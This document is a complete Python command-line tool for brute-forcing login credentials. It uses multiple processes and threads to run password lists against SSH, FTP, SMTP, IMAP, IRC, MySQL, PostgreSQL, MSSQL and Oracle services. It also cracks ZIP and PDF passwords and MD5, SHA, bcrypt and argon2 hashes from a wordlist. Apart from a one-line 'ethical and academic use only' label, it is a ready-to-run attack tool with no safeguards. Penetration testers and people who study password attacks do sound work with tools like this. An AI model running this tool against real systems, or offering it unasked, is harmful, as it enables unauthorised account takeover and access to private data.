#!/usr/bin/env python3
import argparse
import threading
import multiprocessing
import queue
import socket
import sys
import time
import traceback

# Protocol-specific imports
import paramiko        # SSH
import ftplib          # FTP
import smtplib         # SMTP
import pymysql         # MySQL
import psycopg2        # PostgreSQL
import pymssql         # MS SQL
import imaplib         # IMAP
import oracledb        # Oracle (modern)
import hashlib         # for hash check
import zipfile         # ZIP bruteforce
import pyzipper        # Use pyzipper for ZIP bruteforce (added)
import pikepdf         # PDF password check (added)
import bcrypt          # bcrypt hash
from termcolor import colored
from prettytable import PrettyTable
from pathlib import Path

# Argon2 support
try:
    from argon2 import PasswordHasher, exceptions as argon2_exceptions
    ARGON2_AVAILABLE = True
except ImportError:
    ARGON2_AVAILABLE = False

# ----------- Helper Functions ------------

def vprint(msg, color=None, attrs=None):
    allowed_colors = ["green", "red", "yellow", "cyan", None]
    if color not in allowed_colors:
        color = None
    print(colored(msg, color=color, attrs=attrs or ['bold']))

def format_attempt(proto, host, login, password, attempt_num, total, child_id, found, debug):
    msg = f'[ATTEMPT] target {host} - login "{login}" - pass "{password}" - {attempt_num} of {total} [child {child_id}] (0/0)'
    print(colored(msg, 'cyan', attrs=['bold']))
    if found:
        port_map = {
            "ssh": 22, "ftp": 21, "smtp": 25, "mysql": 3306, "postgres": 5432, "mssql": 1433,
            "irc": 6667, "oracle": 1521, "imap": 143
        }
        port = port_map.get(proto, '???')
        msg = f'[{port}][{proto}] host: {host}   login: {login}   password: {password}'
        print(colored(msg, 'green', attrs=['bold']))

def format_status(host, found, proto, debug):
    if found:
        vprint(f"1 of 1 target successfully completed, 1 valid password found", "green", ['bold'])
    else:
        vprint(f"1 of 1 target completed, 0 valid password found", "red", ['bold'])

def error_message(msg):
    print(colored(f'[ERROR] {msg}', 'red', attrs=['bold']))

def info_message(msg):
    print(colored(f'[INFO] {msg}', 'cyan', attrs=['bold']))

# ----------- Brute force worker (threaded & multiproc) ------------

class BruteForceWorker(threading.Thread):
    def __init__(self, target_func, username_queue, password_queue, debug=False, result_flag=None,
                 proto=None, host=None, total_attempts=0, child_id=0):
        super().__init__()
        self.target_func = target_func
        self.username_queue = username_queue
        self.password_queue = password_queue
        self.debug = debug
        self.found = False
        self.result_flag = result_flag
        self.proto = proto
        self.host = host
        self.total_attempts = total_attempts
        self.child_id = child_id

    def run(self):
        attempt_num = 0
        try:
            while not (self.found or (self.result_flag and self.result_flag.is_set())):
                try:
                    username = self.username_queue.get_nowait()
                except queue.Empty:
                    return
                while not (self.found or (self.result_flag and self.result_flag.is_set())):
                    try:
                        password = self.password_queue.get_nowait()
                    except queue.Empty:
                        break
                    attempt_num += 1
                    format_attempt(self.proto, self.host, username, password, attempt_num, self.total_attempts, self.child_id, False, False)
                    try:
                        success = self.target_func(username, password, self.child_id, attempt_num, self.total_attempts)
                    except Exception:
                        continue
                    if success:
                        format_attempt(self.proto, self.host, username, password, attempt_num, self.total_attempts, self.child_id, True, False)
                        self.found = True
                        if self.result_flag:
                            self.result_flag.set()
                        return
        except Exception:
            return

# ----------- Protocol bruteforce implementations with error handling ------------

def is_connection_refused(e):
    msg = str(e).lower()
    return (
        isinstance(e, ConnectionRefusedError)
        or "refused" in msg
        or "connection closed" in msg
        or "timed out" in msg
        or "broken pipe" in msg
        or "no route to host" in msg
        or "reset by peer" in msg
    )

# SSH
_last_ssh_info = {}
def ssh_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, debug=False, port=22):
    global _last_ssh_info
    ssh_info_key = f"{username}@{target_ip}:{port}"
    if ssh_info_key not in _last_ssh_info:
        info_message(f'Testing if password authentication is supported by ssh://{username}@{target_ip}:{port}')
        _last_ssh_info[ssh_info_key] = True
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(target_ip, port=port, username=username, password=password, timeout=5, banner_timeout=5)
        ssh.close()
        info_message(f'Successful, password authentication is supported by ssh://{target_ip}:{port}')
        return True
    except paramiko.ssh_exception.AuthenticationException:
        return False
    except Exception as e:
        msg = str(e).lower()
        if "no route to host" in msg:
            error_message(f"could not connect to ssh://{target_ip}:{port} - No route to host")
        elif is_connection_refused(e):
            error_message(f"could not connect to ssh://{target_ip}:{port} - Connection refused")
        return False

# FTP
def ftp_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, debug=False, port=21):
    try:
        ftp = ftplib.FTP()
        ftp.connect(target_ip, port=port, timeout=5)
        ftp.login(user=username, passwd=password)
        ftp.quit()
        return True
    except ftplib.error_perm:
        return False
    except Exception as e:
        msg = str(e).lower()
        if "no route to host" in msg:
            error_message(f"could not connect to ftp://{target_ip}:{port} - No route to host")
        elif is_connection_refused(e):
            error_message(f"could not connect to ftp://{target_ip}:{port} - Connection refused")
        return False

# IMAP
def imap_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, port=143, use_ssl=False, debug=False):
    try:
        if use_ssl:
            M = imaplib.IMAP4_SSL(target_ip, port)
        else:
            M = imaplib.IMAP4(target_ip, port)
        rv, data = M.login(username, password)
        if rv == "OK":
            M.logout()
            return True
        else:
            M.logout()
            return False
    except imaplib.IMAP4.error:
        return False
    except Exception as e:
        msg = str(e).lower()
        if "no route to host" in msg:
            error_message(f"could not connect to imap://{target_ip}:{port} - No route to host")
        elif is_connection_refused(e):
            error_message(f"could not connect to imap://{target_ip}:{port} - Connection refused")
        return False

# Oracle
def oracle_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, port=1521, debug=False):
    sids = ["ORCL", "XE", "ORACLE", "TEST"]
    services = ["XE", "orcl", "oracle", "test"]
    for sid in sids:
        try:
            dsn = oracledb.makedsn(target_ip, port, sid=sid)
            conn = oracledb.connect(user=username, password=password, dsn=dsn, timeout=5)
            conn.close()
            return True
        except oracledb.DatabaseError as e:
            err = str(e)
            if "ORA-01017" in err or "invalid username/password" in err.lower():
                continue
            elif is_connection_refused(e) or "ORA-12541" in err or "could not resolve" in err.lower():
                error_message(f"could not connect to oracle://{target_ip}:{port} - No route to host")
                continue
            else:
                continue
        except Exception as e:
            continue
    for service in services:
        try:
            dsn = oracledb.makedsn(target_ip, port, service_name=service)
            conn = oracledb.connect(user=username, password=password, dsn=dsn, timeout=5)
            conn.close()
            return True
        except oracledb.DatabaseError as e:
            err = str(e)
            if "ORA-01017" in err or "invalid username/password" in err.lower():
                continue
            elif is_connection_refused(e) or "ORA-12541" in err or "could not resolve" in err.lower():
                error_message(f"could not connect to oracle://{target_ip}:{port} - No route to host")
                continue
            else:
                continue
        except Exception as e:
            continue
    return False

# SMTP
def smtp_bruteforce(username, password, child_id, attempt_num, total, smtp_server=None, port=25, use_ssl=False, debug=False):
    try:
        if use_ssl:
            server = smtplib.SMTP_SSL(smtp_server, port, timeout=5)
        else:
            server = smtplib.SMTP(smtp_server, port, timeout=5)
        server.ehlo()
        server.login(username, password)
        server.quit()
        return True
    except smtplib.SMTPAuthenticationError:
        return False
    except Exception as e:
        msg = str(e).lower()
        if "no route to host" in msg:
            error_message(f"could not connect to smtp://{smtp_server}:{port} - No route to host")
        elif is_connection_refused(e):
            error_message(f"could not connect to smtp://{smtp_server}:{port} - Connection refused")
        return False

# MySQL
def mysql_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, port=3306, debug=False):
    try:
        conn = pymysql.connect(host=target_ip, user=username, password=password, port=port, connect_timeout=5)
        conn.close()
        return True
    except pymysql.err.OperationalError as e:
        if "Access denied" in str(e):
            return False
        elif is_connection_refused(e):
            error_message(f"could not connect to mysql://{target_ip}:{port} - Connection refused")
            return False
        else:
            return False
    except Exception as e:
        msg = str(e).lower()
        if "no route to host" in msg:
            error_message(f"could not connect to mysql://{target_ip}:{port} - No route to host")
        elif is_connection_refused(e):
            error_message(f"could not connect to mysql://{target_ip}:{port} - Connection refused")
        return False

# PostgreSQL
def postgres_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, port=5432, debug=False):
    try:
        conn = psycopg2.connect(host=target_ip, user=username, password=password, port=port, connect_timeout=5)
        conn.close()
        return True
    except psycopg2.OperationalError as e:
        if "authentication failed" in str(e).lower():
            return False
        elif is_connection_refused(e):
            error_message(f"could not connect to postgres://{target_ip}:{port} - Connection refused")
            return False
        else:
            return False
    except Exception as e:
        msg = str(e).lower()
        if "no route to host" in msg:
            error_message(f"could not connect to postgres://{target_ip}:{port} - No route to host")
        elif is_connection_refused(e):
            error_message(f"could not connect to postgres://{target_ip}:{port} - Connection refused")
        return False

# MSSQL
def mssql_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, port=1433, debug=False):
    try:
        conn = pymssql.connect(server=target_ip, user=username, password=password, port=port, timeout=5)
        conn.close()
        return True
    except pymssql.OperationalError as e:
        if "login failed" in str(e).lower():
            return False
        elif is_connection_refused(e):
            error_message(f"could not connect to mssql://{target_ip}:{port} - Connection refused")
            return False
        else:
            return False
    except Exception as e:
        msg = str(e).lower()
        if "no route to host" in msg:
            error_message(f"could not connect to mssql://{target_ip}:{port} - No route to host")
        elif is_connection_refused(e):
            error_message(f"could not connect to mssql://{target_ip}:{port} - Connection refused")
        return False

# IRC
def irc_bruteforce(username, password, child_id, attempt_num, total, target_ip=None, port=6667, debug=False):
    try:
        combos = [
            [("PASS", password), ("NICK", username), ("USER", f"{username} 0 * :mx")],
            [("NICK", username), ("USER", f"{username} 0 * :mx"), ("PASS", password)],
            [("NICK", username), ("PASS", password), ("USER", f"{username} 0 * :mx")],
        ]
        encodings = ["utf-8", "latin1"]
        for encoding in encodings:
            for flow in combos:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(7)
                    s.connect((target_ip, port))
                    for cmd, val in flow:
                        msg = f"{cmd} {val}\r\n".encode(encoding)
                        s.sendall(msg)
                        time.sleep(0.2)
                    try:
                        s.settimeout(2)
                        reply = s.recv(4096)
                        resp = reply.decode(encoding, errors="replace")
                        if any(word in resp.lower() for word in [
                            "001", "002", "welcome", "your host", "ircop", "mode", "motd", "end of",
                            "you are now", "privileges", "logged in", "success", "nick registered"
                        ]):
                            s.close()
                            return True
                        elif any(word in resp.lower() for word in [
                            "throttle", "too many", "wait", "flood", "reconnect", "denied"
                        ]):
                            s.close()
                            return False
                    except socket.timeout:
                        pass
                    s.close()
                except Exception:
                    pass
        return False
    except Exception as e:
        msg = str(e).lower()
        if "no route to host" in msg:
            error_message(f"could not connect to irc://{target_ip}:{port} - No route to host")
        elif is_connection_refused(e):
            error_message(f"could not connect to irc://{target_ip}:{port} - Connection refused")
        return False

# ----------- Multiprocessing BruteForce Manager ------------

def multi_worker(target_func, usernames, passwords, debug, result_flag, proto, host, child_id):
    username_queue = queue.Queue()
    password_queue = queue.Queue()
    for u in usernames:
        if u is not None:
            username_queue.put(u)
    for p in passwords:
        password_queue.put(p)
    total_attempts = len(usernames) * len(passwords)
    threads = []
    for _ in range(4):  # 4 threads per process (tunable)
        t = BruteForceWorker(target_func, username_queue, password_queue, debug=False,
                             result_flag=result_flag, proto=proto, host=host, total_attempts=total_attempts,
                             child_id=child_id)
        threads.append(t)
        t.start()
    for t in threads:
        t.join()

# ----------- File Crack Report -----------

def print_cracking_report(target_type, identifier, hash_algo, status, password, attempts, time_taken, impact):
    table = PrettyTable()
    table.header = False
    table.border = True
    table.add_row(["+-------------------------------------------------------------+"])
    table.add_row(["|                      CRACKING REPORT                         |"])
    table.add_row(["+-------------------------------------------------------------+"])
    table.add_row([f"| Target Type       : {target_type.ljust(44)}|"])
    table.add_row([f"| Target Identifier : {identifier[:46]}|"])
    table.add_row([f"| Hash Algorithm    : {hash_algo.ljust(44)}|"])
    table.add_row([f"| Status            : {status.ljust(44)}|"])
    table.add_row([f"| Password Found    : {password.ljust(44)}|"])
    table.add_row([f"| Attempts          : {str(attempts).ljust(44)}|"])
    table.add_row([f"| Time Taken        : {time_taken.ljust(44)}|"])
    table.add_row(["+-------------------------------------------------------------+"])
    table.add_row([f"| Impact Analysis                                              "])
    for k, v in impact.items():
        table.add_row([f"| - {k.ljust(16)}: {v.ljust(43)}|"])
    table.add_row(["+-------------------------------------------------------------+"])
    print(table.get_string(fields=table.field_names))

# ----------- Hash Cracking -----------

def detect_hash_type(hashval):
    # bcrypt
    if hashval.startswith('$2a$') or hashval.startswith('$2b$') or hashval.startswith('$2y$'):
        return 'bcrypt'
    # argon2
    elif hashval.startswith('$argon2'):
        return 'argon2'
    # sha1
    elif len(hashval) == 40 and all(c in '0123456789abcdef' for c in hashval.lower()):
        return 'sha1'
    # sha256
    elif len(hashval) == 64 and all(c in '0123456789abcdef' for c in hashval.lower()):
        return 'sha256'
    # sha512 or blake2b (both 128 hex)
    elif len(hashval) == 128 and all(c in '0123456789abcdef' for c in hashval.lower()):
        # Try sha512 first, then blake2b
        return 'sha512_blake2b'
    # md5
    elif len(hashval) == 32 and all(c in '0123456789abcdef' for c in hashval.lower()):
        return 'md5'
    else:
        return 'unknown'

def try_hash(password, hashval):
    # Try all hashes
    results = {}

    # bcrypt
    try:
        if (hashval.startswith('$2a$') or hashval.startswith('$2b$') or hashval.startswith('$2y$')):
            results['bcrypt'] = bcrypt.checkpw(password.encode(), hashval.encode())
    except Exception:
        results['bcrypt'] = False

    # argon2
    if ARGON2_AVAILABLE and hashval.startswith('$argon2'):
        try:
            ph = PasswordHasher()
            results['argon2'] = ph.verify(hashval, password)
        except argon2_exceptions.VerifyMismatchError:
            results['argon2'] = False
        except Exception:
            results['argon2'] = False

    # sha1
    try:
        if len(hashval) == 40 and all(c in '0123456789abcdef' for c in hashval.lower()):
            results['sha1'] = hashlib.sha1(password.encode()).hexdigest() == hashval
    except Exception:
        results['sha1'] = False

    # sha256
    try:
        if len(hashval) == 64 and all(c in '0123456789abcdef' for c in hashval.lower()):
            results['sha256'] = hashlib.sha256(password.encode()).hexdigest() == hashval
    except Exception:
        results['sha256'] = False

    # sha512
    try:
        if len(hashval) == 128 and all(c in '0123456789abcdef' for c in hashval.lower()):
            results['sha512'] = hashlib.sha512(password.encode()).hexdigest() == hashval
            # blake2b
            results['blake2b'] = hashlib.blake2b(password.encode()).hexdigest() == hashval
    except Exception:
        results['sha512'] = False
        results['blake2b'] = False

    # md5
    try:
        if len(hashval) == 32 and all(c in '0123456789abcdef' for c in hashval.lower()):
            results['md5'] = hashlib.md5(password.encode()).hexdigest() == hashval
    except Exception:
        results['md5'] = False

    # Return True if any matched
    return any(results.values()), results

# ----------- Main CLI ------------

def main():
    parser = argparse.ArgumentParser(description="Advanced multi-protocol bruteforcer for ethical and academic use only.")
    parser.add_argument("target", nargs="?", help="Target URL or IP with protocol prefix (e.g., ssh://1.2.3.4, ftp://1.2.3.4, imap://mail.com, oracle://1.2.3.4)")
    parser.add_argument("-l", "--username", help="Single username to test")
    parser.add_argument("-L", "--userlist", help="File with multiple usernames")
    parser.add_argument("-P", "--passlist", required=True, help="Password list file")
    parser.add_argument("-t", "--threads", type=int, default=4, help="Number of concurrent threads (default 4)")
    parser.add_argument("--dbg", action="store_true", help="Enable debug verbose output (DEPRECATED, IGNORED)")
    parser.add_argument("-p", "--port", type=int, help="Port number if applicable")
    parser.add_argument("-S", "--ssl", action="store_true", help="Use SSL (for SMTP or IMAP)")
    parser.add_argument("-f", "--file", help="File path (for zip/hash/pdf bruteforce)")

    args = parser.parse_args()

    # Load usernames
    usernames = []
    if args.username:
        usernames.append(args.username)
    elif args.userlist:
        try:
            with open(args.userlist, 'r') as f:
                usernames = [line.strip() for line in f if line.strip()]
        except Exception as e:
            error_message(f"Could not open userlist: {e}")
            sys.exit(1)
    else:
        usernames = [None]

    # Load passwords
    try:
        with open(args.passlist, 'r') as f:
            passwords = [line.strip() for line in f if line.strip()]
    except Exception as e:
        error_message(f"Could not open password list: {e}")
        sys.exit(1)

    # ---- FILE MODE -----
    if args.file and not args.target:
        file_lower = args.file.lower()
        start_time = time.time()
        password_found = None
        attempts = 0
        status = "FAILURE"
        if file_lower.endswith(".zip"):
            identifier = args.file
            hash_algo = "N/A"
            try:
                with pyzipper.AESZipFile(args.file) as zf:
                    for pwd in passwords:
                        attempts += 1
                        try:
                            zf.extractall(pwd=pwd.encode('utf-8'))
                            password_found = pwd
                            status = "SUCCESS"
                            break
                        except Exception:
                            continue
            except Exception as e:
                error_message(f"Failed to open ZIP file: {e}")
                sys.exit(1)
            time_taken = time.strftime('%H:%M:%S', time.gmtime(time.time() - start_time))
            print_cracking_report(
                "ZIP FILE",
                identifier,
                hash_algo,
                status,
                password_found or "N/A",
                attempts,
                time_taken,
                {
                    "Confidentiality": "BREACHED" if status == "SUCCESS" else "SECURE",
                    "Integrity": "COMPROMISED" if status == "SUCCESS" else "INTACT",
                    "Availability": "UNAFFECTED"
                }
            )
        elif file_lower.endswith(".pdf"):
            identifier = args.file
            hash_algo = "N/A"
            try:
                for pwd in passwords:
                    attempts += 1
                    try:
                        with pikepdf.open(args.file, password=pwd):
                            password_found = pwd
                            status = "SUCCESS"
                            break
                    except Exception:
                        continue
            except Exception as e:
                error_message(f"Failed to open PDF file: {e}")
                sys.exit(1)
            time_taken = time.strftime('%H:%M:%S', time.gmtime(time.time() - start_time))
            print_cracking_report(
                "PDF FILE",
                identifier,
                hash_algo,
                status,
                password_found or "N/A",
                attempts,
                time_taken,
                {
                    "Confidentiality": "SECURE" if status == "FAILURE" else "BREACHED",
                    "Integrity": "INTACT",
                    "Availability": "UNAFFECTED"
                }
            )
        elif file_lower.endswith(".hash"):
            identifier = None
            hashval = ""
            try:
                with open(args.file, 'r') as f:
                    hashval = f.read().strip()
            except Exception as e:
                error_message(f"Failed to open hash file: {e}")
                sys.exit(1)
            # Find the type for display (but try all anyway)
            hash_type = detect_hash_type(hashval)
            hash_algo = {
                'bcrypt': 'bcrypt',
                'argon2': 'argon2',
                'sha1': 'SHA-1',
                'sha256': 'SHA-256',
                'sha512_blake2b': 'SHA-512/BLAKE2b',
                'md5': 'MD5',
                'unknown': 'Unknown'
            }.get(hash_type, 'Unknown')
            identifier = hashval[:32] + "..." if len(hashval) > 32 else hashval
            for pwd in passwords:
                attempts += 1
                ok, allres = try_hash(pwd, hashval)
                if ok:
                    password_found = pwd
                    status = "SUCCESS"
                    hash_algo = "/".join([k.upper() for k, v in allres.items() if v])
                    break
            time_taken = time.strftime('%H:%M:%S', time.gmtime(time.time() - start_time))
            print_cracking_report(
                "HASH",
                identifier,
                hash_algo,
                status,
                password_found or "N/A",
                attempts,
                time_taken,
                {
                    "Confidentiality": "BREACHED" if status == "SUCCESS" else "SECURE",
                    "Integrity": "INTACT",
                    "Availability": "UNAFFECTED"
                }
            )
        else:
            error_message(f"Unknown file type for brute-force: {args.file}")
            sys.exit(1)
        sys.exit(0)

    # ---- NETWORK MODE -----
    if not args.target:
        error_message("Please specify a network target (protocol://ip) or a file with -f.")
        sys.exit(1)

    # Parse target protocol and host
    target = args.target
    if "://" not in target:
        error_message("Target must be in protocol:// format")
        sys.exit(1)

    proto, target_rest = target.split("://", 1)
    target_ip = None
    target_port = args.port

    if proto in ["ssh", "ftp", "smb", "irc", "oracle", "mssql", "postgres", "imap"]:
        if ":" in target_rest:
            ip, port_str = target_rest.split(":", 1)
            target_ip = ip
            if not target_port:
                try:
                    target_port = int(port_str)
                except:
                    pass
        else:
            target_ip = target_rest
    elif proto in ["mysql"]:
        if ":" in target_rest:
            ip, port_str = target_rest.split(":", 1)
            target_ip = ip
            if not target_port:
                target_port = int(port_str)
        else:
            target_ip = target_rest
    elif proto in ["smtp"]:
        target_ip = target_rest
        if not target_port:
            target_port = 465 if args.ssl else 25
    else:
        error_message(f"Unsupported protocol: {proto}")
        sys.exit(1)

    # Select target function based on protocol
    if proto == "ssh":
        target_func = lambda u, p, child_id, attempt_num, total: ssh_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, debug=False, port=target_port or 22)
    elif proto == "ftp":
        target_func = lambda u, p, child_id, attempt_num, total: ftp_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, debug=False, port=target_port or 21)
    elif proto == "smtp":
        target_func = lambda u, p, child_id, attempt_num, total: smtp_bruteforce(u, p, child_id, attempt_num, total, smtp_server=target_ip, port=target_port, use_ssl=args.ssl, debug=False)
    elif proto == "mysql":
        target_func = lambda u, p, child_id, attempt_num, total: mysql_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 3306, debug=False)
    elif proto == "postgres":
        target_func = lambda u, p, child_id, attempt_num, total: postgres_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 5432, debug=False)
    elif proto == "mssql":
        target_func = lambda u, p, child_id, attempt_num, total: mssql_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 1433, debug=False)
    elif proto == "irc":
        target_func = lambda u, p, child_id, attempt_num, total: irc_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 6667, debug=False)
    elif proto == "oracle":
        target_func = lambda u, p, child_id, attempt_num, total: oracle_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or 1521, debug=False)
    elif proto == "imap":
        target_func = lambda u, p, child_id, attempt_num, total: imap_bruteforce(u, p, child_id, attempt_num, total, target_ip=target_ip, port=target_port or (993 if args.ssl else 143), use_ssl=args.ssl, debug=False)
    else:
        error_message(f"Protocol {proto} not implemented.")
        sys.exit(1)

    # ----------- Multiprocessing for speed -----------
    num_procs = max(1, args.threads // 4)
    manager = multiprocessing.Manager()
    result_flag = manager.Event()

    chunk_size = len(passwords) // num_procs
    password_chunks = [passwords[i*chunk_size:(i+1)*chunk_size] for i in range(num_procs)]
    if len(password_chunks) < num_procs:
        password_chunks += [[] for _ in range(num_procs - len(password_chunks))]
    if password_chunks and sum(len(x) for x in password_chunks) < len(passwords):
        password_chunks[-1].extend(passwords[sum(len(x) for x in password_chunks):])

    procs = []
    try:
        for i in range(num_procs):
            p = multiprocessing.Process(
                target=multi_worker,
                args=(target_func, usernames, password_chunks[i], False, result_flag, proto, target_ip, i)
            )
            procs.append(p)
            p.start()

        # --- Monitor for result_flag ---
        password_found = False
        while True:
            if result_flag.is_set():
                for p in procs:
                    if p.is_alive():
                        p.terminate()
                password_found = True
                break
            if all(not p.is_alive() for p in procs):
                break
            time.sleep(0.1)
    except KeyboardInterrupt:
        for p in procs:
            if p.is_alive():
                p.terminate()
        print(colored("\n[INFO] Interrupted by user. Exiting cleanly.", "yellow", ["bold"]))
        sys.exit(0)
    except Exception as e:
        error_message(f"Unexpected error: {e}")
        for p in procs:
            if p.is_alive():
                p.terminate()
        sys.exit(1)

    for p in procs:
        p.join()

    format_status(target_ip, password_found, proto, False)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(colored("\n[INFO] Interrupted by user. Exiting cleanly.", "yellow", ["bold"]))
        sys.exit(0)
    except Exception as e:
        error_message(f"Fatal error: {e}")
        sys.exit(1)
